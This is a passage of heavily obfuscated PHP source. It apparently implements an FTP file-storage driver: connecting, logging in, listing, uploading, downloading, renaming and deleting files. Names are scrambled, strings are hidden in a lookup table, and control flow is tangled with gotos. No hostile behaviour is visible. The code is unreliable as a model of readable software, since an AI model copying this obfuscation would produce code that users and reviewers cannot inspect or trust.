__construct($aÙÕå¡Ú°‡) { parent::__construct(); if (count($aÙÕå¡Ú°‡) > 0) { $this->_init($aÙÕå¡Ú°‡); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($AÃŞäÃÒƒ) { $C†ÔÛìù =& $_SERVER[›èö’ù¤]; global $config; $this->appCharset = $config[$C†ÔÛìù[1266]]; $this->systemCharset = $config[$C†ÔÛìù[1267]]; if (isset($AÃŞäÃÒƒ[$C†ÔÛìù[1268]]) && $AÃŞäÃÒƒ[$C†ÔÛìù[1268]]) { $this->systemCharset = $AÃŞäÃÒƒ[$C†ÔÛìù[1268]]; } } public function iconvApp($B„„áŸ¸§Ï) { return $this->iconvTo($B„„áŸ¸§Ï, $this->systemCharset, $this->appCharset); } public function iconvSystem($aã«ƒ¦Ì¯Œ) { return $this->iconvTo($aã«ƒ¦Ì¯Œ, $this->appCharset, $this->systemCharset); } public function getPathOuter($FÌ«Ÿù¼á) { goto B­ã¹Ò¶±; c×ùÑÔ¬ƒ„: return $this->pathDriver . $c©®Ø¸’¹°[8] . ltrim($FÌ«Ÿù¼á, $c©®Ø¸’¹°[8]); goto CÈ²´Ùõ‘‘; D÷º…ô¦Œ–: $FÌ«Ÿù¼á = KodIO::clear($FÌ«Ÿù¼á); $FÌ«Ÿù¼á = substr($FÌ«Ÿù¼á, strlen($DÏ¯òŒâŠ)); if (empty($this->pathDriver)) { return $FÌ«Ÿù¼á; } goto c×ùÑÔ¬ƒ„; B­ã¹Ò¶±: $c©®Ø¸’¹° =& $_SERVER[›èö’ù¤]; $DÏ¯òŒâŠ = $this->iconvApp($this->pathBase); $FÌ«Ÿù¼á = $this->iconvApp($FÌ«Ÿù¼á); goto F—£ƒ†ó£é; F—£ƒ†ó£é: if (substr($DÏ¯òŒâŠ, 0, 2) == $c©®Ø¸’¹°[1269]) { $DÏ¯òŒâŠ = BASIC_PATH . substr($DÏ¯òŒâŠ, 2); } if (substr($FÌ«Ÿù¼á, 0, 2) == $c©®Ø¸’¹°[1269]) { $FÌ«Ÿù¼á = BASIC_PATH . substr($FÌ«Ÿù¼á, 2); } $DÏ¯òŒâŠ = KodIO::clear($DÏ¯òŒâŠ); goto D÷º…ô¦Œ–; CÈ²´Ùõ‘‘: } private function _init($E¢¶ÜË÷Ğ™ = array()) { $cˆ–ÛìÑƒ« =& $_SERVER[›èö’ù¤]; if (!function_exists($cˆ–ÛìÑƒ«[1270])) { throw new Exception(LNG($cˆ–ÛìÑƒ«[1271])); } $this->config = $E¢¶ÜË÷Ğ™; $this->charsetReset($E¢¶ÜË÷Ğ™); foreach ($E¢¶ÜË÷Ğ™ as $dëé™«Â˜ => $Cğò×ğ…Ş) { if (isset($this->{$dëé™«Â˜})) { $this->{$dëé™«Â˜} = $Cğò×ğ…Ş; } } return $this->_login($E¢¶ÜË÷Ğ™); } private function _login($D–ğ¿šÉ»æ) { goto CĞÈĞ’­›; CĞÈĞ’­›: $cŞÔ£ùŒ‡ =& $_SERVER[›èö’ù¤]; static $b¥ïÛ‹ª“ = array(); $c›¶†ÛÔÏ  = md5(json_encode($D–ğ¿šÉ»æ)); goto CÉŸãÈáÖ; CÉŸãÈáÖ: if (isset($b¥ïÛ‹ª“[$c›¶†ÛÔÏ ])) { foreach ($b¥ïÛ‹ª“[$c›¶†ÛÔÏ ] as $f”—«ˆ‰Ê => $B¢ªøÏ±) { $this->{$f”—«ˆ‰Ê} = $B¢ªøÏ±; } return !0; } $CáØÖÍ±™â = parse_url(trim($this->server, $cŞÔ£ùŒ‡[8])); $this->host = $CáØÖÍ±™â[$cŞÔ£ùŒ‡[175]]; goto Bï•ø‡•´³; eã™©¯ÉÖ: $b¥ïÛ‹ª“[$c›¶†ÛÔÏ ] = array($cŞÔ£ùŒ‡[1275] => $this->connect, $cŞÔ£ùŒ‡[175] => $this->host, $cŞÔ£ùŒ‡[174] => $this->scheme, $cŞÔ£ùŒ‡[176] => $this->port); return $Bğ¿Š…¯°; goto Aã´ÄÈïªÅ; dÉÅÏçÄƒ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $e½ÍÁÏĞå» = $this->pasv == $cŞÔ£ùŒ‡[87] ? !0 : !1; @ftp_pasv($this->connect, $e½ÍÁÏĞå»); goto eã™©¯ÉÖ; b÷Êã£ÂÙ“: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Bğ¿Š…¯° = @ftp_login($this->connect, $this->username, $this->userpass); goto dÉÅÏçÄƒ; Bï•ø‡•´³: $A£¯—ª´À = isset($CáØÖÍ±™â[$cŞÔ£ùŒ‡[174]]) && $CáØÖÍ±™â[$cŞÔ£ùŒ‡[174]] == $cŞÔ£ùŒ‡[1272] ? !0 : !1; $this->scheme = $A£¯—ª´À ? $cŞÔ£ùŒ‡[1273] : $cŞÔ£ùŒ‡[1274]; $this->port = isset($CáØÖÍ±™â[$cŞÔ£ùŒ‡[176]]) ? $CáØÖÍ±™â[$cŞÔ£ùŒ‡[176]] : 21; goto b÷Êã£ÂÙ“; Aã´ÄÈïªÅ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($DßŞÔõÈĞ, $F¼ˆÎòòç½ = '', $Bé…šÅ‡— = REPEAT_RENAME) { if ($this->setContent($DßŞÔõÈĞ, $F¼ˆÎòòç½)) { return $this->getPathOuter($DßŞÔõÈĞ); } return !1; } public function mkdir($aŞ‰ó„ÖÊ—, $dÉ×Ï«É = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $aŞ‰ó„ÖÊ— = $this->iconvSystem($aŞ‰ó„ÖÊ—); if ($this->_isFolder($aŞ‰ó„ÖÊ—) || @ftp_mkdir($this->connect, $aŞ‰ó„ÖÊ—)) { return $this->getPathOuter($aŞ‰ó„ÖÊ—); } if (!$this->mkdir($this->pathFather($aŞ‰ó„ÖÊ—))) { return !1; } if ($aŞ‰ó„ÖÊ— = @ftp_mkdir($this->connect, $aŞ‰ó„ÖÊ—)) { return $this->getPathOuter($aŞ‰ó„ÖÊ—); } return !1; } public function copyFile($fÛÑ´î˜ÊÓ, $Eğ¬¶‹¯¹ï) { goto BÂ¨ÆÅŒÏ; BÂ¨ÆÅŒÏ: if (!$this->_isconn()) { return !1; } $aˆ¥²é‹Ùì = $this->pathThis($this->iconvSystem($fÛÑ´î˜ÊÓ)); $BÒÅ…Ê·÷ = $this->tempFile($aˆ¥²é‹Ùì); goto bê¯êå½Ò; AóÚ½ÌÚ´Ó: $this->tempFileRemve($BÒÅ…Ê·÷); return $b²¨Ãîã; goto f›µˆ¨ªÛß; bê¯êå½Ò: $aÑ¨±Ìœ‡Ã = $this->iconvApp($BÒÅ…Ê·÷); $this->download($fÛÑ´î˜ÊÓ, $aÑ¨±Ìœ‡Ã); $b²¨Ãîã = $this->upload($Eğ¬¶‹¯¹ï, $aÑ¨±Ìœ‡Ã); goto AóÚ½ÌÚ´Ó; f›µˆ¨ªÛß: } public function moveFile($dëºïäø¾ì, $a‹•ˆ©±®) { if (!$this->_isconn()) { return !1; } $dëºïäø¾ì = $this->iconvSystem($dëºïäø¾ì); $a‹•ˆ©±® = $this->iconvSystem($a‹•ˆ©±®); $fìò–âÓÆ = @ftp_rename($this->connect, $dëºïäø¾ì, $a‹•ˆ©±®); return $fìò–âÓÆ ? $this->getPathOuter($a‹•ˆ©±®) : !1; } public function delFile($DÂ¾¹ÔàèÙ) { if (!$this->_isconn()) { return !1; } $DÂ¾¹ÔàèÙ = $this->iconvSystem($DÂ¾¹ÔàèÙ); return @ftp_delete($this->connect, $DÂ¾¹ÔàèÙ); } public function delFolder($CÁÁ‘õå) { goto e ÖÖä ºƒ; e ÖÖä ºƒ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $fÙêÛ‹Ä´ = $dªÛæƒÊìï = array(); goto cí¸äö”šŞ; cí¸äö”šŞ: $this->fileList($CÁÁ‘õå, $fÙêÛ‹Ä´, $dªÛæƒÊìï, !0); $this->listItemCache = !0; foreach ($dªÛæƒÊìï as $cÅİáÑ¼òˆ) { $D×æõ²µÎ¨ = $this->iconvSystem($cÅİáÑ¼òˆ[$_SERVER[›èö’ù¤][28]]); $fßÔ—½Üò = @ftp_delete($this->connect, $D×æõ²µÎ¨); if (!$fßÔ—½Üò) { return !1; } } goto b„ÏÔ®…È‚; b„ÏÔ®…È‚: foreach ($fÙêÛ‹Ä´ as $D×æõ²µÎ¨) { $D×æõ²µÎ¨ = $this->iconvSystem($D×æõ²µÎ¨); $fßÔ—½Üò = @ftp_rmdir($this->connect, $D×æõ²µÎ¨); if (!$fßÔ—½Üò) { return !1; } } $CÁÁ‘õå = $this->iconvSystem($CÁÁ‘õå); return @ftp_rmdir($this->connect, $CÁÁ‘õå); goto Cã¡œÔãòÄ; Cã¡œÔãòÄ: } public function rename($Bœƒóãà‘, $e®èÇ¬¿ÃÆ) { goto EÓĞÁµÍ½ƒ; a‹Êß¿¡‘Æ: return $A¿‰£–¹ß¤ ? $this->getPathOuter($FëĞéô˜Ú×) : !1; goto fÏÉÆ‰”áÙ; EÓĞÁµÍ½ƒ: $D©íçÑ­¢ì =& $_SERVER[›èö’ù¤]; if (!$this->_isconn()) { return !1; } $aÒÒ·¢Œëğ = $this->fileNameAuto($this->pathFather($Bœƒóãà‘), $e®èÇ¬¿ÃÆ); goto f™öÉ…¢; f™öÉ…¢: $aÒÒ·¢Œëğ = $this->iconvSystem($aÒÒ·¢Œëğ); $Bœƒóãà‘ = $this->iconvSystem($Bœƒóãà‘); $D÷¨ÃÆØãâ = $this->pathFather($Bœƒóãà‘); goto bé†„»»; bé†„»»: $FëĞéô˜Ú× = rtrim($D÷¨ÃÆØãâ, $D©íçÑ­¢ì[8]) . $D©íçÑ­¢ì[8] . $aÒÒ·¢Œëğ; $A¿‰£–¹ß¤ = @ftp_rename($this->connect, $Bœƒóãà‘, $FëĞéô˜Ú×); $FëĞéô˜Ú× = $this->iconvApp($FëĞéô˜Ú×); goto a‹Êß¿¡‘Æ; fÏÉÆ‰”áÙ: } private function folderInfo($D¿İÏ˜Ó¯­, $BŸ¾ÔáÌš® = false) { $eÏ‚™Ç¨„ =& $_SERVER[›èö’ù¤]; $cç‘À·°’ƒ = array($eÏ‚™Ç¨„[28] => $this->pathThis($D¿İÏ˜Ó¯­), $eÏ‚™Ç¨„[76] => $this->getPathOuter($eÏ‚™Ç¨„[8] . $D¿İÏ˜Ó¯­), $eÏ‚™Ç¨„[29] => $eÏ‚™Ç¨„[77]); if ($BŸ¾ÔáÌš®) { return $cç‘À·°’ƒ; } $cç‘À·°’ƒ[$eÏ‚™Ç¨„[194]] = $cç‘À·°’ƒ[$eÏ‚™Ç¨„[84]] = 0; $cç‘À·°’ƒ[$eÏ‚™Ç¨„[195]] = $cç‘À·°’ƒ[$eÏ‚™Ç¨„[196]] = !0; return $cç‘À·°’ƒ; } private function fileInfo($Dß¿ÅÎ—Ê÷, $aæ–Êä†®‹ = false, $AÛİéŞ¾„ã = array()) { goto F„»Ù‹ÁÎ; Fäçö‡¥˜î: return $B¿À„æ£”¾; goto AÈÜ—ø›Î×; F„»Ù‹ÁÎ: $fÜÎ—·Ó‘ =& $_SERVER[›èö’ù¤]; $B¿À„æ£”¾ = array($fÜÎ—·Ó‘[28] => $this->pathThis($Dß¿ÅÎ—Ê÷), $fÜÎ—·Ó‘[76] => $this->getPathOuter($fÜÎ—·Ó‘[8] . $Dß¿ÅÎ—Ê÷), $fÜÎ—·Ó‘[29] => $fÜÎ—·Ó‘[193], $fÜÎ—·Ó‘[78] => isset($AÛİéŞ¾„ã[$fÜÎ—·Ó‘[78]]) ? $AÛİéŞ¾„ã[$fÜÎ—·Ó‘[78]] : 0, $fÜÎ—·Ó‘[168] => $this->ext($Dß¿ÅÎ—Ê÷)); if ($aæ–Êä†®‹) { return $B¿À„æ£”¾; } goto eëõÀøŒ¢²; eëõÀøŒ¢²: $B¿À„æ£”¾[$fÜÎ—·Ó‘[194]] = $B¿À„æ£”¾[$fÜÎ—·Ó‘[84]] = 0; $B¿À„æ£”¾[$fÜÎ—·Ó‘[195]] = $B¿À„æ£”¾[$fÜÎ—·Ó‘[196]] = !0; $B‰°°® = $this->iconvSystem($Dß¿ÅÎ—Ê÷); goto CÉÎ¢®ÂìÎ; CÉÎ¢®ÂìÎ: $B¿À„æ£”¾[$fÜÎ—·Ó‘[84]] = @ftp_mdtm($this->connect, $B‰°°®); if (empty($AÛİéŞ¾„ã)) { $AÛİéŞ¾„ã = $this->objectMeta($Dß¿ÅÎ—Ê÷); if (!$AÛİéŞ¾„ã) { return $B¿À„æ£”¾; } } $B¿À„æ£”¾[$fÜÎ—·Ó‘[78]] = $AÛİéŞ¾„ã[$fÜÎ—·Ó‘[78]]; goto Fäçö‡¥˜î; AÈÜ—ø›Î×: } public function size($C´¦ğÀƒÓ¿) { $fäˆ®•İµ³ = $this->objectMeta($C´¦ğÀƒÓ¿); return $fäˆ®•İµ³ ? $fäˆ®•İµ³[$_SERVER[›èö’ù¤][78]] : 0; } public function info($a¥ÙÃØì‹¸) { if ($this->isFile($a¥ÙÃØì‹¸)) { return $this->fileInfo($a¥ÙÃØì‹¸, 0); } else { if ($this->isFolder($a¥ÙÃØì‹¸)) { return $this->folderInfo($a¥ÙÃØì‹¸); } } return !1; } private function fileList($A‡õìÍˆƒ, &$eÀî§ˆ‚Ğ, &$F†Àˆëß…, $EÀÖ´¤Õ‡Ü = false) { goto DŠö’£‹ì°; d…İ‚ğ–´Ø: $cœ¾ì¹‡‘× = $this->listItemCache === !1 ? !1 : !0; $CíƒØÑ†øÏ = @ftp_rawlist($this->connect, $A‡õìÍˆƒ); if (!$CíƒØÑ†øÏ) { $CíƒØÑ†øÏ = array(); } goto aí‹‚¬¼İ; aí‹‚¬¼İ: $aÓŸÅƒÊÊÆ = array($E®½‚ğ·„İ[95] => 1, $E®½‚ğ·„İ[1276] => 1); foreach ($CíƒØÑ†øÏ as $AãâÃ½óã¥) { goto AÛ¢ìæ®±ˆ; AÛ¢ìæ®±ˆ: $c’¥‹¶°•¯ = $this->_listItem($AãâÃ½óã¥); if ($c’¥‹¶°•¯[0] == $E®½‚ğ·„İ[743]) { continue; } $Dë°«ô½æ = $c’¥‹¶°•¯[8]; goto eëÔæÓ¤Í; eëÔæÓ¤Í: if (empty($Dë°«ô½æ) && $Dë°«ô½æ !== $E®½‚ğ·„İ[191] || isset($aÓŸÅƒÊÊÆ[$Dë°«ô½æ])) { continue; } $Dë°«ô½æ = $this->iconvApp($A‡õìÍˆƒ . ltrim($Dë°«ô½æ, $E®½‚ğ·„İ[8])); $c‚Íµ×•ê = array($E®½‚ğ·„İ[28] => $Dë°«ô½æ, $E®½‚ğ·„İ[29] => $E®½‚ğ·„İ[193], $E®½‚ğ·„İ[78] => $c’¥‹¶°•¯[4]); goto b¹ÁÏŸ¼Œ›; E°Ê¢äƒ— : if ($bØÛ±Îô”±) { $eÀî§ˆ‚Ğ[] = $Dë°«ô½æ; if ($EÀÖ´¤Õ‡Ü) { $this->fileList($Dë°«ô½æ, $eÀî§ˆ‚Ğ, $F†Àˆëß…, $EÀÖ´¤Õ‡Ü); } continue; } $F†Àˆëß…[] = $c‚Íµ×•ê; goto E¶Œ³ƒùŞö; b¹ÁÏŸ¼Œ›: if (substr($AãâÃ½óã¥, 0, 1) == $E®½‚ğ·„İ[1277]) { $c‚Íµ×•ê[$E®½‚ğ·„İ[29]] = $E®½‚ğ·„İ[77]; $c‚Íµ×•ê[$E®½‚ğ·„İ[78]] = 0; } $bØÛ±Îô”± = $c‚Íµ×•ê[$E®½‚ğ·„İ[29]] == $E®½‚ğ·„İ[77] ? !0 : !1; if ($cœ¾ì¹‡‘×) { $this->cacheMethod($E®½‚ğ·„İ[199], $Dë°«ô½æ, $bØÛ±Îô”±); $this->cacheMethod($E®½‚ğ·„İ[200], $Dë°«ô½æ, $c‚Íµ×•ê); } goto E°Ê¢äƒ— ; E¶Œ³ƒùŞö: } if ($cœ¾ì¹‡‘×) { $this->cacheMethod($E®½‚ğ·„İ[199], $A‡õìÍˆƒ, !0); } goto B†‹†™„; DŠö’£‹ì°: $E®½‚ğ·„İ =& $_SERVER[›èö’ù¤]; $A‡õìÍˆƒ = $this->iconvSystem($A‡õìÍˆƒ); if (!$this->isFolder($A‡õìÍˆƒ)) { return !1; } goto AÕ”¹é‹Ÿ; AÕ”¹é‹Ÿ: @ftp_chdir($this->connect, $E®½‚ğ·„İ[8]); $A‡õìÍˆƒ = rtrim($A‡õìÍˆƒ, $E®½‚ğ·„İ[8]) . $E®½‚ğ·„İ[8]; check_abort(); goto d…İ‚ğ–´Ø; B†‹†™„: } private function _listItem($F½¸ÓÁÓ¹) { if (empty($F½¸ÓÁÓ¹)) { return array(); } $e²«’§ß = preg_split($_SERVER[›èö’ù¤][1278], $F½¸ÓÁÓ¹); if (count($e²«’§ß) <= 9) { return $e²«’§ß; } $e²«’§ß[8] = trim(substr($F½¸ÓÁÓ¹, strpos($F½¸ÓÁÓ¹, $e²«’§ß[7]) + strlen($e²«’§ß[7]))); return array_splice($e²«’§ß, 0, 9); } public function listPath($fß®ÒË•›â, $E´·Ã¦‘ Õ = false) { goto E¥Ÿ»¼êŞÔ; e“„É†Çá¶: $this->fileList($fß®ÒË•›â, $aòöî¼àç†, $bƒÜŸŠ‰Å); foreach ($aòöî¼àç† as $Fæ¢Â™×ÔÏ => $e»ˆç‰©»Ï) { $aòöî¼àç†[$Fæ¢Â™×ÔÏ] = $this->folderInfo($e»ˆç‰©»Ï, $E´·Ã¦‘ Õ); } foreach ($bƒÜŸŠ‰Å as $Fæ¢Â™×ÔÏ => $e»ˆç‰©»Ï) { $bƒÜŸŠ‰Å[$Fæ¢Â™×ÔÏ] = $this->fileInfo($e»ˆç‰©»Ï[$CØÈ¹¼Ø¨—[28]], $E´·Ã¦‘ Õ, $e»ˆç‰©»Ï); } goto fí§‚ÌÜ“Å; E¥Ÿ»¼êŞÔ: $CØÈ¹¼Ø¨— =& $_SERVER[›èö’ù¤]; if (!$this->_isconn()) { return !1; } $aòöî¼àç† = $bƒÜŸŠ‰Å = array(); goto e“„É†Çá¶; fí§‚ÌÜ“Å: return array($CØÈ¹¼Ø¨—[75] => $aòöî¼àç†, $CØÈ¹¼Ø¨—[74] => $bƒÜŸŠ‰Å); goto Cèãª·Ô±¯; Cèãª·Ô±¯: } public function has($e›íË¼®âã, $FéøÓ¤‹‰ = false, $BÁ¤ÌàÉù = true) { goto FÄˆ•„ŒñÔ; AØæã‹ä÷º: return !1; goto C“¼éÍÜˆß; bŸ·½ÒÃ­: $this->fileList($e›íË¼®âã, $B’ÔèÇæƒó, $d×§÷¸õƒ¯, $d•ôÉÍğ”·); if ($FéøÓ¤‹‰) { return array($dá‰·—«Ò[203] => count($d×§÷¸õƒ¯), $dá‰·—«Ò[204] => count($B’ÔèÇæƒó)); } if ($BÁ¤ÌàÉù) { if (count($d×§÷¸õƒ¯)) { return !0; } } else { if (count($B’ÔèÇæƒó)) { return !0; } } goto AØæã‹ä÷º; FÄˆ•„ŒñÔ: $dá‰·—«Ò =& $_SERVER[›èö’ù¤]; $B’ÔèÇæƒó = $d×§÷¸õƒ¯ = array(); $d•ôÉÍğ”· = $FéøÓ¤‹‰ ? !0 : !1; goto bŸ·½ÒÃ­; C“¼éÍÜˆß: } public function listAll($eğïè‡½º) { goto FÜÉ‹³–Ñ; bˆô¿©¥: foreach ($aœ™“îô®Ä as $FŒ ¨ö¾¥) { if (is_string($FŒ ¨ö¾¥)) { $aŒ×ïÀÔñë[$FŒ ¨ö¾¥] = 0; } } return $this->listAllFiles($eğïè‡½º, array_keys($aŒ×ïÀÔñë), $aŒ×ïÀÔñë); goto aêœŒšöÎ†; FÜÉ‹³–Ñ: $D¿†Î©›ŒÚ =& $_SERVER[›èö’ù¤]; if (!$this->_isconn()) { return !1; } $aœ™“îô®Ä = $d‚êÍÉÚÁï = array(); goto c¤º¿÷‹İ¡; c¤º¿÷‹İ¡: $this->fileList($eğïè‡½º, $aœ™“îô®Ä, $d‚êÍÉÚÁï, !0); $aŒ×ïÀÔñë = array(); foreach ($d‚êÍÉÚÁï as $FŒ ¨ö¾¥) { $aŒ×ïÀÔñë[$FŒ ¨ö¾¥[$D¿†Î©›ŒÚ[28]]] = $FŒ ¨ö¾¥[$D¿†Î©›ŒÚ[78]]; } goto bˆô¿©¥; aêœŒšöÎ†: } public function getContent($FóÌ÷œ¡›) { if (!$this->_isconn()) { return !1; } $FóÌ÷œ¡› = $this->iconvSystem($FóÌ÷œ¡›); return $this->fileSubstr($FóÌ÷œ¡›); } public function setContent($cõƒÊÓ±„‘, $DÄ´ÕöÃò = '') { goto EÎ‰·…øÇ³; EÎ‰·…øÇ³: if (!$this->_isconn()) { return !1; } $Eš’Ì·«—ß = $this->pathThis($this->iconvSystem($cõƒÊÓ±„‘)); $cñ¦éÙˆ¥ = $this->tempFile($Eš’Ì·«—ß); goto bµœÜ…Î³; bµœÜ…Î³: file_put_contents($cñ¦éÙˆ¥, $DÄ´ÕöÃò); $b…—Àµçè = $this->upload($cõƒÊÓ±„‘, $this->iconvApp($cñ¦éÙˆ¥)); $this->tempFileRemve($cñ¦éÙˆ¥); goto E²³›«•Úò; E²³›«•Úò: return $b…—Àµçè; goto A£Ò†Üì¯÷; A£Ò†Üì¯÷: } public function fileSubstr($f’òõƒƒø÷, $DÌ”¤ó§ƒÕ = 0, $c„ùö‡Œ¦– = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($f’òõƒƒø÷, $DÌ”¤ó§ƒÕ, $c„ùö‡Œ¦–); } private function ftpRequest($fÉ¢ãÉø¥ , $E¥«ÜèãÂ = 0, $CˆºèÛªõ = false) { goto C ‚ê¸†Ğ; C ‚ê¸†Ğ: $fÉ¢ãÉø¥  = $this->iconvSystem($fÉ¢ãÉø¥ ); $a‹Èƒ‰ºç = $this->scheme . $this->host . $_SERVER[›èö’ù¤][4] . $this->port; $F¾ŒË‰ˆÓ = curl_init(); goto FøÓä¶ÑÜ£; EÎä¿×ÁÁ²: curl_setopt($F¾ŒË‰ˆÓ, CURLOPT_RETURNTRANSFER, 1); $d‹Í¦İÀ¹ = curl_exec($F¾ŒË‰ˆÓ); curl_close($F¾ŒË‰ˆÓ); goto F¦µ Šù; FøÓä¶ÑÜ£: curl_setopt($F¾ŒË‰ˆÓ, CURLOPT_URL, $a‹Èƒ‰ºç . $this->pathEncode($fÉ¢ãÉø¥ )); curl_setopt($F¾ŒË‰ˆÓ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($CˆºèÛªõ) { $E“Şôª“ = $E¥«ÜèãÂ + $CˆºèÛªõ - 1; curl_setopt($F¾ŒË‰ˆÓ, CURLOPT_RANGE, "{$E¥«ÜèãÂ}\x2d{$E“Şôª“}"); } goto EÎä¿×ÁÁ²; F¦µ Šù: return $d‹Í¦İÀ¹; goto b©‘õ‰›¹; b©‘õ‰›¹: } public function upload($cÙñ±”šÍÌ, $f²àÃçŠ, $EÆ†ºÅŒ¯É = false, $Dš£Ü³øô = REPEAT_REPLACE) { goto eÂâî¬Ÿ»; FÅÑñ·ãÉÍ: $f²àÃçŠ = $this->iconvSystem($f²àÃçŠ); $B²Ïñ§éå‰ = ftp_nb_put($this->connect, $cÙñ±”šÍÌ, $f²àÃçŠ, FTP_BINARY); while ($B²Ïñ§éå‰ == FTP_MOREDATA) { $B²Ïñ§éå‰ = ftp_nb_continue($this->connect); } goto AÅÎó¿×; eÂâî¬Ÿ»: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($cÙñ±”šÍÌ))) { return !1; } $cÙñ±”šÍÌ = $this->iconvSystem($cÙñ±”šÍÌ); goto FÅÑñ·ãÉÍ; AÅÎó¿×: if ($B²Ïñ§éå‰ != FTP_FINISHED) { return !1; } return $this->getPathOuter($cÙñ±”šÍÌ); goto b×À“ŞÙÍÚ; b×À“ŞÙÍÚ: } public function download($cÜÊ¥¦âòß, $BÑŒôğ‰¾Œ = '') { goto Dˆ¾ó¯¸Ä; bä—‰ë©‹•: $cÜÊ¥¦âòß = $this->iconvSystem($cÜÊ¥¦âòß); $BÑŒôğ‰¾Œ = $this->iconvSystem($BÑŒôğ‰¾Œ); $b›Ú…˜óø» = ftp_nb_get($this->connect, $BÑŒôğ‰¾Œ, $cÜÊ¥¦âòß, FTP_BINARY); goto Eí¥—ºŒù”; Eí¥—ºŒù”: while ($b›Ú…˜óø» == FTP_MOREDATA) { $b›Ú…˜óø» = ftp_nb_continue($this->connect); } if ($b›Ú…˜óø» != FTP_FINISHED) { return !1; } return $this->iconvApp($BÑŒôğ‰¾Œ); goto A’õƒ·¤³; Dˆ¾ó¯¸Ä: if (!$this->_isconn()) { return !1; } $CùÌË³ãê— = $this->pathFather($BÑŒôğ‰¾Œ); if (!IO::mkdir($CùÌË³ãê—)) { return !1; } goto bä—‰ë©‹•; A’õƒ·¤³: } public function exist($Bè÷ÏëÀğø) { return $this->isFile($Bè÷ÏëÀğø) || $this->isFolder($Bè÷ÏëÀğø); } public function isFile($f¢œ²†ÍŞƒ) { return !$this->isFolder($f¢œ²†ÍŞƒ) && $this->objectMeta($f¢œ²†ÍŞƒ); } public function isFolder($D¸İëº²Ü) { return $this->cacheMethod($_SERVER[›èö’ù¤][199], $D¸İëº²Ü); } protected function objectMeta($EÔèèŠíÄ³) { return $this->cacheMethod($_SERVER[›èö’ù¤][200], $EÔèèŠíÄ³); } protected function _objectMeta($e‡¸è†•É­) { goto dšÀÆ¹’„; dšÀÆ¹’„: $d¯¦‰‰¾ Š =& $_SERVER[›èö’ù¤]; if ($e‡¸è†•É­ == $d¯¦‰‰¾ Š[33] || $e‡¸è†•É­ == $d¯¦‰‰¾ Š[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto FÅöíİø¤ä; FÅöíİø¤ä: $e‡¸è†•É­ = $this->iconvSystem($e‡¸è†•É­); $Eãá¶µªÜ = array($d¯¦‰‰¾ Š[28] => $this->iconvApp($e‡¸è†•É­), $d¯¦‰‰¾ Š[29] => $d¯¦‰‰¾ Š[193], $d¯¦‰‰¾ Š[78] => 0); @ftp_chdir($this->connect, $d¯¦‰‰¾ Š[8]); goto a¼¨´¥¼•; a¼¨´¥¼•: $eøãò‹ÏÖ = @ftp_size($this->connect, $e‡¸è†•É­); if ($eøãò‹ÏÖ != -1) { $Eãá¶µªÜ[$d¯¦‰‰¾ Š[78]] = $eøãò‹ÏÖ; } else { $e·¨”øÊ× = @ftp_chdir($this->connect, $e‡¸è†•É­); if (!$e·¨”øÊ×) { return !1; } $Eãá¶µªÜ[$d¯¦‰‰¾ Š[29]] = $d¯¦‰‰¾ Š[77]; } return $Eãá¶µªÜ; goto Fï£±õ˜Ã; Fï£±õ˜Ã: } protected function _isFolder($cÑøå†­‚ö) { $AñÖìô“• =& $_SERVER[›èö’ù¤]; if ($cÑøå†­‚ö == $AñÖìô“•[33] || $cÑøå†­‚ö == $AñÖìô“•[8]) { return !0; } $bù¨ÔîĞœ = $this->_objectMeta($cÑøå†­‚ö); return isset($bù¨ÔîĞœ[$AñÖìô“•[29]]) && $bù¨ÔîĞœ[$AñÖìô“•[29]] == $AñÖìô“•[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($bó¥˜í¥Åö) { if (substr($bó¥˜í¥Åö, 0, 2) == $_SERVER[›èö’ù¤][1269]) { $bó¥˜í¥Åö = BASIC_PATH . substr($bó¥˜í¥Åö, 2); } return $bó¥˜í¥Åö; } public function iconvApp($b®ºòÍìšé) { $fÅ–§£©› =& $_SERVER[›èö’ù¤]; global $config; return $this->iconvTo($b®ºòÍìšé, $config[$fÅ–§£©›[1267]], $config[$fÅ–§£©›[1266]]); } public function iconvSystem($C¿È×‡ÑèÕ) { $DÈ£ñ³éÚë =& $_SERVER[›èö’ù¤]; global $config; return $this->iconvTo($C¿È×‡ÑèÕ, $config[$DÈ£ñ³éÚë[1266]], $config[$DÈ£ñ³éÚë[1267]]); } public function getPathOuter($fÒÃ‡ÜÏèá) { goto C£¤»Ñ“‰; Eì®ñÛ—‘Ë: $fÒÃ‡ÜÏèá = KodIO::clear($fÒÃ‡ÜÏèá); $fÒÃ‡ÜÏèá = substr($fÒÃ‡ÜÏèá, strlen($bË¦²£¨í)); if (empty($this->pathDriver)) { return $fÒÃ‡ÜÏèá; } goto EØ£Ê¦Î³§; Cçµ×ïà±í: if (substr($bË¦²£¨í, 0, 2) == $a‹›áŠŸŒ[1269]) { $bË¦²£¨í = BASIC_PATH . substr($bË¦²£¨í, 2); } if (substr($fÒÃ‡ÜÏèá, 0, 2) == $a‹›áŠŸŒ[1269]) { $fÒÃ‡ÜÏèá = BASIC_PATH . substr($fÒÃ‡ÜÏèá, 2); } $bË¦²£¨í = KodIO::clear($bË¦²£¨í); goto Eì®ñÛ—‘Ë; C£¤»Ñ“‰: $a‹›áŠŸŒ =& $_SERVER[›èö’ù¤]; $bË¦²£¨í = $this->iconvApp($this->pathBase); $fÒÃ‡ÜÏèá = $this->iconvApp($fÒÃ‡ÜÏèá); goto Cçµ×ïà±í; EØ£Ê¦Î³§: return $this->pathDriver . $a‹›áŠŸŒ[8] . ltrim($fÒÃ‡ÜÏèá, $a‹›áŠŸŒ[8]); goto bñŒš›£’†; bñŒš›£’†: } public function mkfile($fÄÖÁ†«×», $c”¤ÇƒÏ¡ = '', $DóÄ’¿ï¦ = REPEAT_RENAME) { $fÄÖÁ†«×» = $this->iconvSystem($fÄÖÁ†«×»); 